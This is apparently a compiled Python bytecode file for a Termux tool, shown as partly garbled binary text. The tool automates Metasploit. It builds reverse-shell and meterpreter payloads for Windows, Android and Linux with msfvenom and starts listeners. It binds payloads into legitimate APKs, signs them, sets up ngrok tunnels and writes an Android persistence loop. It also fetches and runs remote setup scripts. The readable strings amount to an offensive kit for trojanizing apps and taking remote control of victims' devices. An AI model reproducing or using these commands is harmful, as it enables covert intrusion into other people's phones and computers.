o
    ?:c	?  ?                   @   s?  d dl Z d dlZd dlZd dlmZ d dlmZ G dd? d?Zdd? Zdd	? Zd
d? Z	dd? Z
dd? Zdd? Zdd? Zdd? Zdd? Zdd? Zdd? Zdd? Zdd? Zd d!? Zd"d#? Zd$d%? Zd&d'? Zd(d)? Zd*d+? Zd,d-? Ze ?d.?d kr?eejd/ ? e?d0? neejd1 ? e?d2? e?  d3d4? Ze ?d5?d kr?eejd6 ? e?d0? neejd7 ? e?d2? e?  d8d9? Zd:ekr?e?  dS dS );?    N)?get)?sleepc                   @   s4   e Zd ZdZdZdZdZdZdZdZ	dZ
d	Zd
ZdS )?colorsz[37mz[0mz[31mz[1;32mz[33mz[34mz[35mz[97mz[41mz[93mN)?__name__?
__module__?__qualname__?whit?end?red?greenZorangeZblue?purpleZwhiteZredfZyellow? r   r   ?"/sdcard/Download/Adro/msf-andro.pyr   
   s    r   c                 C   ?2   | d D ]}t j?|? t j??  t?d? qd S )N?
g{?G?zd???sys?stdout?write?flush?timer   ??s?cr   r   r   ?	slowprint   ?
   
?r   c                 C   r   )Nr   g{?G?z??r   r   r   r   r   ?
slowprint2   r   r   c                   C   s   t ?d? t ?d? d S )N?clearzbash banner.sh)?os?systemr   r   r   r   ?start#   s   
r    c                  C   s6   t d? td?j} ttjd tj |  ? t d? d S )Nr   zhttps://api.ipify.orgz[IP] Your Public Ip is : )?printr   ?textr   r   r   r   )Zipr   r   r   ?pubip'   s   
r#   c                  C   s?  t ?  tj?d?rttjd ? t?d? t	?  d S z?t
ttjd ?? t?d? td?} | dkrRt?d? t?d	? t?d
? ttjd ? t?d? t	?  W d S | dkrkt?d? t?d? t?d
? t	?  W d S | dkr?t?d? t?d? t?d
? t	?  W d S | dkr?t?d? t?d? t?d
? t	?  W d S | dkr?t?d? t?d? t?d
? t?d
? W d S ttjd ? t?d? t	?  W d S    ttjd ? t?d? t	?  Y d S )Nz&/data/data/com.termux/files/home/ngrokz[+] NGROK ALREADY FOUND?   u   [*] Architecture Type ⬇️ zdpkg --print-architecturezE[37m[+] Enter Above Displayed Architecture Type ( Default = arm ) : Zaarch64zFwget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zipz"unzip ngrok-stable-linux-arm64.zipzchmod 777 ngrokz[+] Done [+]Zamd64zFwget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zipz"unzip ngrok-stable-linux-amd64.zipZarmzDwget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zipz unzip ngrok-stable-linux-arm.zipZarmhf? z[!] Architecture Not Found z[!] System Error)r    r   ?path?isfiler   r   r   r   r   ?menur!   ?strr   ?inputr
   Zslopwprint2)Zngrr   r   r   ?ngrokins-   sV   




















r+   c                  C   s<  t ?  td? td? td? ttd??} | dkrPt ?  ttjd ?}|dks7|dks7|d	ks7|d
ks7|dkrKt?d? t?d? t?d? t?  d S t?  d S | dkr?t ?  ttd??}ttd??}ttd??}ttd??}zt?d?	||||?? W d S    td? t
?d? t?  Y d S | dkr?t?  d S t?  d S )Nz"[37m[[31m1[37m]  Install APKMODz[37m[[31m2[37m]  Bind APK
z[37m[[31m00[37m] Back
z [37m[[31m+[37m] [1;32mMSF > ?1z0 [+] Are you sure to Install Metasploit ? <y/n> ?y?Y?yes?YES?Yes?cd $HOME?Dwget https://raw.githubusercontent.com/Hax4us/Apkmod/master/setup.sh?sh setup.sh?2?[37m[+] LHOST : ?[37m[+] LPORT : z [37m[+] Path To Original APK : z [37m[+] Path To  Binded  Apk : z+apkmod -a -b {0} -o {1} LHOST={2} LPORT={3}z)[37m[[31m![37m] PAYLOAD BINDING FAILED?   ?3)r    r   r)   r*   r   r   r   r   r(   ?formatr   r   )?uchoiceZmsfbind?host?portZorgapkZbindapkr   r   r   ?bind\   s:   (







r>   c                  C   s?   t ?  t?d?dkr-ttd??} ttd??}zt?d?| |?? W d S    td? Y d S td? ttd??}|d	ksK|d
ksK|dksK|dksK|dkrP|?  d S t?  d S )N?which apkmod >/dev/null 2>&1r   z [37m[+] Path To Unsigned APK : z[37m[+] Path To Signed APK : zapkmod -s {0} -o {1}z&[37m[[31m![37m] APK SIGN FAILED ...z'[37m[[31m![37m] APKMOD not installedz%Jump To Apkmod Installtion (y/n) ? : r-   r.   r/   r0   r1   )r    r   r   r)   r*   r:   r   r(   )Z	unsignapk?signapk?	apkmodinsr   r   r   r@   }   s   (

r@   c                  C   s?   t ?  tj?d?rtd? t?d? t?  d S tdd??} | ?	d? | ?
?  td? td? t?d? W d   ? n1 s=w   Y  t?  d S )	Nz	inject.shz4[37m[[31m+[37m] Script Already Found As inject.shr8   ?azz#!/bin/bash
while :
do am start --user o -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
sleep 20
doner%   z-[37m[[31m+[37m] Script Saved as inject.sh ?   )r    r   r&   r'   r   r   r   r(   ?openr   ?closer!   )?fr   r   r   ?persistence?   s   


?
rG   c                  C   s?   t ?  td? td? td? td? td? td? td? ttd??} | d	kr.t?  d S | d
kr7t?  d S | dkr@t?  d S | dkrIt?  d S | dkrRt?  d S | dkr[t	?  d S | dkrdt
?  d S t?  d S )Nz'
[37m [[35m1[37m] Install Metasploitz"[37m [[35m2[37m] Create Payloadz![37m [[35m3[37m] Start Listnerz [37m [[35m4[37m] Payload Bindz"[37m [[35m5[37m] Download Ngrokz[37m [[35m6[37m] Sign Apkz([37m [[35m7[37m] Android persistence
z[37m [[31m+[37m] [35mMSF > r,   r5   r9   ?4?5?6?7)r    r   r)   r*   ?
msfinstall?crpay?lisr>   r+   r@   rG   r(   )r;   r   r   r   r(   ?   s0   







r(   c                  C   ?`   t ?  td? ttjd ? ttd??} | dkrt?  | dkr"t?  | dkr+t	?  d S t
?  d S )Nz2[37m[[31m+[37m] Listner Menu [37m[[31m+[37m]?F
PAYLOADS AVAIBLE :

[1]  Windows
[2]  Android
[3]  Linux

[00] Back

?[37m[[31m+[37m] Payload > r,   r5   r9   )r    r   r   r   r   r)   r*   ?liswin?lisandro?lislinuxr(   )Zlispayr   r   r   rN   ?   ?   

rN   c                  C   s&  t ?  t?  ttjd ? ttd??} | dkr5t?  ttd??}ttd??}d}t?d?	|||?? t
?  | dkrWt?  ttd??}ttd??}d	}t?d?	|||?? t
?  | d
kryt?  ttd??}ttd??}d}t?d?	|||?? t
?  | dkr?t?  ttd??}ttd??}d}t?d?	|||?? t
?  | dkr?t?  ttd??}ttd??}d}t?d?	|||?? t
?  | dkr?t?  ttd??}ttd??}d}t?d?	|||?? t
?  | dk?rt?  ttd??}ttd??}d}t?d?	|||?? t
?  d S | dk?rt
?  d S t
?  d S )N?  
[1]  windows/shell/reverse_tcp
[2]  windows/meterpreter/reverse_http
[3]  windows/meterpreter/reverse_https
[4]  windows/meterpreter/reverse_tcp
[5]  windows/meterpreter_reverse_http
[6]  windows/meterpreter_reverse_https
[7]  windows/meterpreter_reverse_tcp

[00] Back

?[37m[[31m+[37m] Win > r,   r6   r7   ?windows/shell/reverse_tcp?amsfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'r5   ? windows/meterpreter/reverse_httpr9   ?!windows/meterpreter/reverse_httpsrH   ?windows/meterpreter/reverse_tcprI   ? windows/meterpreter_reverse_httprJ   ?!windows/meterpreter_reverse_httpsrK   ?windows/meterpreter_reverse_tcp?00?r    r#   r   r   r   r)   r*   r   r   r:   r(   )?winr<   r=   Zwinpayr   r   r   rR   ?   sp   




rR   c                  C   sV  t ?  t?  ttjd ? ttd??} | dkr4ttd??}ttd??}d} t?d?	||| ?? t
?  d S | dkrUttd??}ttd??}d	} t?d?	||| ?? t
?  d S | d
krvttd??}ttd??}d} t?d?	||| ?? t
?  d S | dkr?ttd??}ttd??}d} t?d?	||| ?? t
?  d S | dkr?ttd??}ttd??}d} t?d?	||| ?? t
?  d S | dkr?ttd??}ttd??}d} t?d?	||| ?? t
?  d S | dkr?ttd??}ttd??}d} t?d?	||| ?? t
?  d S | dk?rttd??}ttd??}d} t?d?	||| ?? t
?  d S | dk?r&t
?  d S t
?  d S )NaO  
[1]  android/shell/reverse_http
[2]  android/shell/reverse_https
[3]  android/shell/reverse_tcp
[4]  android/meterpreter/reverse_http
[5]  android/meterpreter/reverse_https
[6]  android/meterpreter/reverse_tcp
[7]  android/meterpreter_reverse_http
[8]  android/meterpreter_reverse_https
[9]  android/meterpreter_reverse_tcp
[00] Back
?[37m[[31m+[37m] Android > r,   r6   r7   ?android/shell/reverse_httprY   r5   ?android/shell/reverse_httpsr9   ?android/shell/reverse_tcprI   ?!android/meterpreter/reverse_httpsrJ   ?android/meterpreter/reverse_tcprK   ? android/meterpreter_reverse_http?8?!android/meterpreter_reverse_https?9?android/meterpreter_reverse_tcpr`   ra   )Zandror<   r=   r   r   r   rS     sn   











rS   c                  C   sV  t ?  t?  ttjd ? ttd??} | dkr4ttd??}ttd??}d}t?d?	|||?? t
?  d S | dkrUttd??}ttd??}d	}t?d?	|||?? t
?  d S | d
krvttd??}ttd??}d}t?d?	|||?? t
?  d S | dkr?ttd??}ttd??}d}t?d?	|||?? t
?  d S | dkr?ttd??}ttd??}d}t?d?	|||?? t
?  d S | dkr?ttd??}ttd??}d}t?d?	|||?? t
?  d S | dkr?ttd??}ttd??}d}t?d?	|||?? t
?  d S | dk?rttd??}ttd??}d}t?d?	|||?? t
?  d S | dk?r&t
?  d S t
?  d S )Na=  
[1]  linux/x86/shell/reverse_tcp
[2]  linux/x86/meterpreter_reverse_http
[3]  linux/x86/meterpreter_reverse_https
[4]  linux/x86/meterpreter_reverse_tcp
[5]  linux/x64/shell/reverse_tcp
[6]  linux/x64/meterpreter_reverse_http
[7]  linux/x64/meterpreter_reverse_https
[8]  linux/x64/meterpreter_reverse_tcp
[00] Back
?[37m[[31m+[37m] Linux > r,   r6   r7   ?linux/x86/shell/reverse_tcprY   r5   ?"linux/x86/meterpreter_reverse_httpr9   ?#linux/x86/meterpreter_reverse_httpsrH   ?!linux/x86/meterpreter_reverse_tcprI   ?linux/x64/shell/reverse_tcprJ   z"linux/x64/meterpreter_reverse_httprK   ?#linux/x64/meterpreter_reverse_httpsrj   ?!linux/x64/meterpreter_reverse_tcpr`   ra   )Zlinxr<   r=   Zlinuxpayr   r   r   rT   b  sn   











rT   c                  C   rO   )Nz9[37m[[31m+[37m] Create Payload Menu [37m[[31m+[37m]rP   rQ   r,   r5   r9   )r    r   r   r   r   r)   r*   ?crwin?crandro?crlinuxr(   )?payr   r   r   rM   ?  rU   rM   c                  C   s?  t ?  t?  ttjd ? ttd??} | dkr?t?  ttd??}ttd??}ttd??}td? ttj	d ? td? ttj	d	 ? td? t
?d
?|||?? td? ttj	d ? td? ttjd ? td? ttd??}|dks?|dks?|dks?|dkr?d}t
?d?|||?? t?  nttjd ? td? ttj	d ? t?d? t?  | dk?rFt?  ttd??}ttd??}ttd??}td? ttj	d ? td? ttj	d	 ? td? t
?d?|||?? td? ttj	d ? td? ttjd ? td? ttd??}|dk?s|dk?s|dk?s|dk?r,d}t
?d?|||?? t?  nttjd ? td? ttj	d ? t?d? t?  | dk?r?t?  ttd??}ttd??}ttd??}td? ttj	d ? td? ttj	d	 ? td? t
?d?|||?? td? ttj	d ? td? ttjd ? td? ttd??}|dk?s?|dk?s?|dk?s?|dk?r?d}t
?d?|||?? t?  nttjd ? td? ttj	d ? t?d? t?  | dk?r~t?  ttd??}ttd??}ttd??}td? ttj	d ? td? ttj	d	 ? td? t
?d?|||?? td? ttj	d ? td? ttjd ? td? ttd??}|dk?sT|dk?sT|dk?sT|dk?rdd}t
?d?|||?? t?  nttjd ? td? ttj	d ? t?d? t?  | d k?rt?  ttd??}ttd??}ttd??}td? ttj	d ? td? ttj	d	 ? td? t
?d!?|||?? td? ttj	d ? td? ttjd ? td? ttd??}|dk?s?|dk?s?|dk?s?|dk?r d"}t
?d?|||?? t?  nttjd ? td? ttj	d ? t?d? t?  | d#k?r?t?  ttd??}ttd??}ttd??}td? ttj	d ? td? ttj	d	 ? td? t
?d$?|||?? td? ttj	d ? td? ttjd ? td? ttd??}|dk?s?|dk?s?|dk?s?|dk?r?d%}t
?d?|||?? t?  nttjd ? td? ttj	d ? t?d? t?  | d&k?rUt?  ttd??}ttd??}ttd??}td? ttj	d ? td? ttj	d	 ? td? t
?d'?|||?? td? ttj	d ? td? ttjd ? td? ttd??}|dk?s(|dk?s(|dk?s(|dk?r9d(}t
?d?|||?? t?  d S ttjd ? td? ttj	d ? t?d? t?  d S t?d? t?  d S ))NrV   rW   r,   r6   r7   ?[37m[+] OUTPUT NAME : r   ?8####################### Starting #######################?8################## Generating Payload ##################z^msfvenom --platform windows -p windows/shell/reverse_tcp LHOST={0} LPORT={1} -f exe -o {2}.exe?8############## Payload Generating Success ##############?8######################## Done ##########################?#[33m [+] Start a Listner (Y/N)  : r1   r/   r-   r.   rX   rY   ?8################## Starting Listner ####################?9################# Starting Listner Failed ###############r$   r5   zemsfvenom --platform windows -p windows/meterpreter/reverse_http LHOST={0} LPORT={1} -f exe -o {2}.exerZ   r9   zfmsfvenom --platform windows -p windows/meterpreter/reverse_https LHOST={0} LPORT={1} -f exe -o {2}.exer[   rH   zdmsfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f exe -o {2}.exer\   rI   zemsfvenom --platform windows -p windows/meterpreter_reverse_http LHOST={0} LPORT={1} -f exe -o {2}.exer]   rJ   zfmsfvenom --platform windows -p windows/meterpreter_reverse_https LHOST={0} LPORT={1} -f exe -o {2}.exer^   rK   zdmsfvenom --platform windows -p windows/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f exe -o {2}.exer_   )r    r#   r   r   r   r)   r*   r!   r   r
   r   r   r:   r(   r   r   )rb   r<   r=   ?outpZwinlisry   r   r   r   rv   ?  sx   

(

(

(

(

(

(




rv   c                  C   s?
  t ?  t?  ttjd ? ttd??} | dkr?ttd??}ttd??}ttd??}td? ttj	d ? td? ttj	d	 ? td? t
?d
?|||?? td? ttj	d ? td? ttjd ? td? ttd??}|dks}|dks}|dks}|dkr?td? ttjd ? d}t
?d?|||?? t?  ntd? ttj	d ? t?  | dk?r>ttd??}ttd??}ttd??}td? ttj	d ? td? ttj	d	 ? td? t
?d?|||?? td? ttj	d ? td? ttjd ? td? ttd??}|dk?s|dk?s|dk?s|dk?r0td? ttjd ? d}t
?d?|||?? t?  ntd? ttj	d ? t?  | dk?r?ttd??}ttd??}ttd??}td? ttj	d ? td? ttj	d	 ? td? t
?d?|||?? td? ttj	d ? td? ttjd ? td? ttd??}|dk?s?|dk?s?|dk?s?|dk?r?td? ttjd ? d}t
?d?|||?? t?  ntd? ttj	d ? t?  | dk?rnttd??}ttd??}ttd??}td? ttj	d ? td? ttj	d	 ? td? t
?d?|||?? td? ttj	d ? td? ttjd ? td? ttd??}|dk?sE|dk?sE|dk?sE|dk?r`td? ttjd ? d }t
?d?|||?? t?  ntd? ttj	d ? t?  | d!k?rttd??}ttd??}ttd??}td? ttj	d ? td? ttj	d	 ? td? t
?d"?|||?? td? ttj	d ? td? ttjd ? td? ttd??}|dk?s?|dk?s?|dk?s?|dk?r?td? ttjd ? d#}t
?d?|||?? t?  ntd? ttj	d ? t?  | d$k?r?ttd??}ttd??}ttd??}td? ttj	d ? td? ttj	d	 ? td? t
?d%?|||?? td? ttj	d ? td? ttjd ? td? ttd??}|dk?su|dk?su|dk?su|dk?r?td? ttjd ? d&}t
?d?|||?? t?  ntd? ttj	d ? t?  | d'k?r6ttd??}ttd??}ttd??}td? ttj	d ? td? ttj	d	 ? td? t
?d(?|||?? td? ttj	d ? td? ttjd ? td? ttd??}|dk?s|dk?s|dk?s|dk?r(td? ttjd) ? d*}t
?d?|||?? t?  ntd? ttj	d ? t?  | d+k?r?ttd??}ttd??}ttd??}td? ttj	d ? td? ttj	d	 ? td? t
?d,?|||?? td? ttj	d ? td? ttjd ? td? ttd??}|dk?s?|dk?s?|dk?s?|dk?r?td? ttjd ? d-}t
?d?|||?? t?  ntd? ttj	d ? t?  | d.k?rittd??}ttd??}ttd??}td? ttj	d ? td? ttj	d	 ? td? t
?d/?|||?? td? ttj	d ? td? ttjd ? td? ttd??}|dk?s=|dk?s=|dk?s=|dk?rYtd? ttjd ? d0}t
?d?|||?? t?  d S td? ttj	d ? t?  d S t?  d S )1NaR   
[1]  android/shell/reverse_http
[2]  android/shell/reverse_https
[3]  android/shell/reverse_tcp
[4]  android/meterpreter/reverse_http
[5]  android/meterpreter/reverse_https
[6]  android/meterpreter/reverse_tcp
[7]  android/meterpreter_reverse_http
[8]  android/meterpreter_reverse_https
[9]  android/meterpreter_reverse_tcp

[00] Back

rc   r,   r6   r7   rz   r   r{   r|   zXmsfvenom --platform android -p android/shell/reverse_http LHOST={0} LPORT={1} -o {2}.apkr}   r~   r   r1   r/   r-   r.   r?   rd   rY   r?   r5   zYmsfvenom --platform android -p android/shell/reverse_https LHOST={0} LPORT={1} -o {2}.apkre   r9   zWmsfvenom --platform android -p android/shell/reverse_tcp LHOST={0} LPORT={1} -o {2}.apkrf   ?9################ Starting Listner Failed ################rH   z^msfvenom --platform android -p android/meterpreter/reverse_http LHOST={0} LPORT={1} -o {2}.apk?8######################### Done #########################z android/meterpreter/reverse_httprI   z_msfvenom --platform android -p android/meterpreter/reverse_https LHOST={0} LPORT={1} -o {2}.apkrg   rJ   z]msfvenom --platform android -p android/meterpreter/reverse_tcp LHOST={0} LPORT={1} -o {2}.apkrh   rK   z^msfvenom --platform android -p android/meterpreter_reverse_http LHOST={0} LPORT={1} -o {2}.apk?8################# Starting Listner #####################ri   rj   z_msfvenom --platform android -p android/meterpreter_reverse_https LHOST={0} LPORT={1} -o {2}.apkrk   rl   z]msfvenom --platform android -p android/meterpreter_reverse_tcp LHOST={0} LPORT={1} -o {2}.apkrm   ?r    r#   r   r   r   r)   r*   r!   r   r
   r   r   r:   r(   )Z
crandrogetr<   r=   r?   Zandrolisry   r   r   r   rw   ?  s?   
(
(
(
(
(
(
(
(


rw   c                  C   s?	  t ?  t?  ttjd ? ttd??} | dkr?ttd??}ttd??}ttd??}td? ttj	d ? td? ttj	d	 ? td? t
?d
?|||?? td? ttj	d ? td? ttjd ? td? ttd??}|dks}|dks}|dks}|dkr?td? ttjd ? d}t
?d?|||?? t?  ntd? ttj	d ? t?  | dk?r>ttd??}ttd??}ttd??}td? ttj	d ? td? ttj	d ? td? t
?d?|||?? td? ttj	d ? td? ttjd ? td? ttd??}|dk?s|dk?s|dk?s|dk?r0td? ttjd ? d}t
?d?|||?? t?  ntd? ttj	d ? t?  | dk?r?ttd??}ttd??}ttd??}td? ttj	d ? td? ttj	d	 ? td? t
?d?|||?? td? ttj	d ? td? ttjd ? td? ttd??}|dk?s?|dk?s?|dk?s?|dk?r?td? ttjd ? d}t
?d?|||?? t?  ntd? ttj	d ? t?  | dk?rnttd??}ttd??}ttd??}td? ttj	d ? td? ttj	d ? td? t
?d ?|||?? td? ttj	d ? td? ttjd ? td? ttd??}|dk?sE|dk?sE|dk?sE|dk?r`td? ttjd ? d!}t
?d?|||?? t?  ntd? ttj	d" ? t?  | d#k?rttd??}ttd??}ttd??}td? ttj	d$ ? td? ttj	d	 ? td? t
?d%?|||?? td? ttj	d ? td? ttjd ? td? ttd??}|dk?s?|dk?s?|dk?s?|dk?r?td? ttjd ? d&}t
?d?|||?? t?  ntd? ttj	d" ? t?  | d'k?r?ttd??}ttd??}ttd??}td? ttj	d ? td? ttj	d ? td? t
?d%?|||?? td? ttj	d ? td? ttjd ? td? ttd??}|dk?su|dk?su|dk?su|dk?r?td? ttjd( ? d&}t
?d?|||?? t?  ntd? ttj	d" ? t?  | d)k?r6ttd??}ttd??}ttd??}td? ttj	d$ ? td? ttj	d ? td? t
?d*?|||?? td? ttj	d ? td? ttjd ? td? ttd??}|dk?s|dk?s|dk?s|dk?r(td? ttjd+ ? d,}t
?d?|||?? t?  ntd? ttj	d ? t?  | d-k?r?ttd??}ttd??}ttd??}td? ttj	d$ ? td? ttj	d	 ? td? t
?d.?|||?? td? ttj	d ? td? ttjd ? td? ttd??}|dk?s?|dk?s?|dk?s?|dk?r?td? ttjd ? d/}t
?d?|||?? t?  d S td? ttj	d" ? t?  d S t?  d S )0Na?  
[1]  linux/x86/shell/reverse_tcp
[2]  linux/x86/meterpreter_reverse_http
[3]  linux/x86/meterpreter_reverse_https
[4]  linux/x86/meterpreter_reverse_tcp
[5]  linux/x64/shell/reverse_tcp
[6]  linux/x64/meterpreter_reverse_http
[7]  linux/x64/meterpreter_reverse_https
[8]  linux/x64/meterpreter_reverse_tcp

[00] Back

rn   r,   r6   r7   rz   r   r{   r|   z^msfvenom --platform linux -f elf -p linux/x86/shell/reverse_tcp LHOST={0} LPORT={1} -o {2}.elfr}   r?   r   r1   r/   r-   r.   r?   ro   rY   r?   r5   z8################# Generating Payload ###################zemsfvenom --platform linux -f elf -p linux/x86/meterpreter_reverse_http LHOST={0} LPORT={1} -o {2}.elfr~   rp   r9   zfmsfvenom --platform linux -f elf -p linux/x86/meterpreter_reverse_https LHOST={0} LPORT={1} -o {2}.elfz8############# Payload Generating Success ###############rq   rH   zdmsfvenom --platform linux -f elf -p linux/x86/meterpreter_reverse_tcp LHOST={0} LPORT={1} -o {2}.elfrr   r?   rI   z8######################## Starting ######################z^msfvenom --platform linux -f elf -p linux/x64/shell/reverse_tcp LHOST={0} LPORT={1} -o {2}.elfrs   rJ   z9################### Starting Listner ####################rK   zfmsfvenom --platform linux -f elf -p linux/x64/meterpreter_reverse_https LHOST={0} LPORT={1} -o {2}.elfr?   rt   rj   zdmsfvenom --platform linux -f elf -p linux/x64/meterpreter_reverse_tcp LHOST={0} LPORT={1} -o {2}.elfru   r?   )Z
crlinuxgetr<   r=   r?   Zlinuxlisry   r   r   r   rx   ?  s?   
(
(
(
(
(
(
(


rx   c                   C   s6   t tjd ? t?d? t?d? t?d? t?  d S )Nz [!] Stoping Script [!]r$   z)pg_ctl -D $PREFIX/var/lib/postgresql stopz	apt clean)r   r   r
   r   r   r   r   ?quitr   r   r   r   ?exit?  s
   



r?   c                   C   sV   t tjd ? t?d? t tjd ? t?d? t?d? t tjd ? t?d? d S )Nu    [ ✔ ] SERVICE MSFDB STARTING?   u#    [ ✔ ] SERVICE POSTGRSQL STARTINGz3initdb $PREFIX/var/lib/postgresql > /dev/null 2>&1 z;pg_ctl -D $PREFIX/var/lib/postgresql start > /dev/null 2>&1u"    [ ✔ ] SERVICE POSTGRSQL STARTEDr$   )r   r   r   r   r   r   r   r   r   r   r   ?dbstart?  s   


r?   c                  C   s|   t ?  ttjd ?} | dks| dks| dks| dks| dkr9t?d? t?d? t?d	? t?d
? t?d? d S t?  d S )Nz2 [ + ] Are you sure to Install Metasploit ? <y/n> r-   r.   r/   r0   r1   r2   zapt install wgetz[wget https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.shzchmod +x metasploit.shz./metasploit.sh)r    r*   r   r   r   r   r(   )Zmsfir   r   r   rL   ?  s   (




rL   z which msfconsole >/dev/null 2>&1u#    [ ✔ ] Metasploit-Framework Foundr?   z% [ x ] Metasploit-Framework Not Foundr$   c                  C   sr   t ?  ttjd ?} | dks| dks| dks| dks| dkr4t?d? t?d? t?d	? t?d
? d S t?  d S )Nz. [ + ] Are you sure to Install APKMOD ? <y/n> r-   r.   r/   r0   r1   r2   r3   r4   rC   )	r    r*   r   r   r   r   r   r   r(   )Zaminsr   r   r   rA   ?  s   (



rA   r?   u    [ ✔ ] Apkmod Foundz [ x ] Apkmod Not Foundc                  C   sh   z	t ?  t?  W d S  ty3   ttjd ?} | dks'| dks'| dks'| dkr-t?  Y d S t?  Y d S w )Nz

 [c] Continue [q] Quit : r   ?C?continueZContinue)r?   r(   ?KeyboardInterruptr*   r   r
   r?   )Zconr   r   r   ?program?  s    ?r?   ?__main__) r   r   r   Zrequestsr   r   r   r   r   r    r#   r+   r>   r@   rG   r(   rN   rR   rS   rT   rM   rv   rw   rx   r?   r?   rL   r   r   rA   r?   r   r   r   r   r   ?<module>   s^   /!MEF Z   m	




?